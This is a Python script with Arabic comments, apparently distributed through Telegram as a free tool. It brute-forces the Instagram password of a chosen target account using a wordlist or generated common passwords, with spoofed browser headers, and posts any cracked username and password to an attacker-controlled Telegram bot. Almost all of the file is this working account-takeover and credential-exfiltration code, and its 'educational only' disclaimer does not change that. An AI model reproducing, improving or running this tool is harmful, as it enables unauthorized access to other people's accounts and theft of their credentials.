# PYTHON ....
# Telegram : @A_fkf7 - @R_fb7 
# instagram : ****
#ركز 👇 

# هذه الاداة مجانية وليست للبيع الرجاء عدم بيعها ..
# عدم ازالة الحقوق تقديرا لتعبنا وجعلنا نستمر في تقديم مثل هكذا (ادوات او بوتات)..
#ثق بربك ومن خلقك اذه اشوفك تبيع اباده اخليك تحير شلون تحذف حسابك اخمط ونشر لاكن تبيع بي ان،** عرضك صفح
#=========================

#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import random
import os
import time
from user_agent import generate_user_agent
import sys

skali = '\033[1;31m' 
Smart = '\033[1;33m' 
Hu = '\033[1;32m' 
E = '\033[1;31m'
Kali = '\033[1;33m'
F = '\033[2;32m'
Ca = "\033[1;97m" 
B = '\033[2;36m' 
Y = '\033[1;34m' 
y = '\033[1;35m' 
f = '\033[2;35m' 
K = '\033[3;33m' 

logo = f"""
{skali}██████╗ ██████╗ ███╗   ██╗███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝
██████╔╝██████╔╝██╔██╗ ██║█████╗  
██╔══██╗██╔══██╗██║╚██╗██║██╔══╝  
██████╔╝██║  ██║██║ ╚████║███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝
{Smart}╔═══════════════════════════════════╗
║  {Kali}اداة تاريخ المتطورة للاختراق   {Smart}║
║   {Kali}Telegram: @A_fkf7 - @R_fb7  {Smart}║
╚═══════════════════════════════════╝
"""

def welcome_message():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(logo)
    print(f"{Kali}╔══════════════════════════════════════════════════╗")
    print(f"{Kali}║ {Ca}تحذير: هذه الأداة للأغراض التعليمية والشخصية فقط! {Kali}║")
    print(f"{Kali}║ {E}يمنع استخدامها لأي غرض تخريبي أو غير قانوني! {Kali}║")
    print(f"{Kali}╚══════════════════════════════════════════════════╝\n")
    
    print(f"{Hu}شروط الاستخدام:")
    print(f"{Ca}1. هذه الأداة مجانية ولا يجوز بيعها أو تداولها")
    print(f"{Ca}2. يجب عدم إزالة حقوق المطورين")
    print(f"{Ca}3. استخدام الأداة على مسؤوليتك الشخصية\n")
    
    agree = input(f"{Kali}هل توافق على شروط الاستخدام؟ (y/n): {Ca}")
    if agree.lower() != 'y':
        print(f"{E}يجب الموافقة على الشروط لاستخدام الأداة!")
        time.sleep(2)
        sys.exit()
    
    os.system('clear' if os.name == 'posix' else 'cls')
    print(logo)
    print(f"{Kali}╔═══════════════════════════════════════╗")
    print(f"{Kali}║    {Ca}أاهلاً بك في اداة تاريخ للاختراق    {Kali}║")
    print(f"{Kali}╚═══════════════════════════════════════╝\n")
    print(f"{Kali}╔═══════════════════════════════════════╗")
    print(f"{Kali}║ {Ca}1. تخمين من ملف باسورد محدد        {Kali}║")
    print(f"{Kali}║ {Ca}2. تخمين بدون ملف (باسوردات عشوائية) {Kali}║")
    print(f"{Kali}╚═══════════════════════════════════════╝")

def progress_bar(progress, total, length=30):
    percent = progress / total
    filled = int(length * percent)
    bar = f"{Hu}█" * filled + f"{skali}░" * (length - filled)
    return f"{Ca}[{bar}] {int(percent*100)}%"

def generate_random_passwords(count=100):
    common_passwords = [
        "123456", "password", "123456789", "12345678", "12345",
        "12345mmmmm", "admin", "123123", "111111", "qwerty",
        "abc123", "1234", "letmein", "welcome", "monkey",
        "1234567890", "1111111111mmmmmm", "iloveyou", "123456a", "sunshine"
    ]
    
    random_passwords = []
   
    random_passwords.extend(common_passwords)
    
   
    for _ in range(count - len(common_passwords)):
        length = random.randint(6, 12)
        password = ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()", k=length))
        random_passwords.append(password)
    
    return random_passwords

def try_login(username, password, token, user_id):
    session = requests.Session()
    
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip,deflate,br',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-length': '269',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': generate_user_agent(),
        'x-csrftoken': 'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '8a8118fa7d40',
        'x-requested-with': 'XMLHttpRequest'
    }
    
    data = {
        'username': username,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }

    try:
        response = session.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=data)
        if 'userId' in response.text:
            print(f"\n{F}[+] تم الاختراق بنجاح")
            print(f"{Ca}يوزر حساب: {Hu}{username}")
            print(f"{Ca}كلمة المرور: {Hu}{password}")
            
           
            send_message = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={user_id}&text=• تم اختراق الحساب بواسطة ابن بابل\n\n• اسم المستخدم: {username}\n• كلمة المرور: {password}"
            requests.post(send_message)
            return True
        return False
    except Exception as e:
        print(f"{E}خطأ في الاتصال: {str(e)}")
        return False

def main():
    welcome_message()
    
    choice = input(f"\n{Smart}اختر طريقة الاختراق (1/2): {Ca}")
    
   
    token = input(f"\n{Smart}أدخل توكن البوت: {Ca}")
    user_id = input(f"{Smart}أدخل آيدي المستخدم: {Ca}")
    target_user = input(f"{Smart}أدخل اسم المستهدف (@ بدون): {Ca}")
    
    passwords = []
    total_passwords = 0
    
    if choice == '1':
       
        password_file = input(f"{Smart}أدخل مسار ملف كلمات المرور: {Ca}")
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
            total_passwords = len(passwords)
            print(f"{Ca}تم تحميل {Hu}{total_passwords}{Ca} كلمة مرور من الملف")
        except:
            print(f"{E}حدث خطأ أثناء قراءة الملف!")
            return
    
    elif choice == '2':
       
        num_passwords = input(f"{Smart}عدد كلمات المرور المراد توليدها (افتراضي 1000): {Ca}") or "1000"
        try:
            num_passwords = int(num_passwords)
            if num_passwords > 1000000:
                print(f"{E}الحد الأقصى المسموح به هو مليون كلمة مرور")
                num_passwords = 10000
            passwords = generate_random_passwords(num_passwords)
            total_passwords = len(passwords)
            print(f"{Ca}تم توليد {Hu}{total_passwords}{Ca} كلمة مرور عشوائية")
        except:
            print(f"{E}يجب إدخال رقم صحيح!")
            return
    
    else:
        print(f"{E}اختيار غير صحيح!")
        return
    
    print(f"\n{Smart}بدء عملية الاختراق على الحساب: {Hu}@{target_user}")
    print(f"{Ca}══════════════════════════════════════════════")
    
   
    found = False
    attempts = 0
    
    for password in passwords:
        attempts += 1
        print(f"\r{progress_bar(attempts, total_passwords)} | {Ca}جاري الاختراق: {Hu}{password[:20]}{' ' * 10}", end='', flush=True)
        
        if try_login(target_user, password, token, user_id):
            found = True
            break
    
    if not found:
        print(f"\n\n{E}لم يتم العثور على كلمة المرور بعد {attempts} محاولة!")
        send_message = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={user_id}&text=• فشل في اختراق الحساب\n\n• المستخدم: {target_user}\n• عدد المحاولات: {attempts}"
        requests.post(send_message)
    
    print(f"\n\n{Smart}تم الانتهاء من العملية!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{E}تم إيقاف العملية!")
        sys.exit()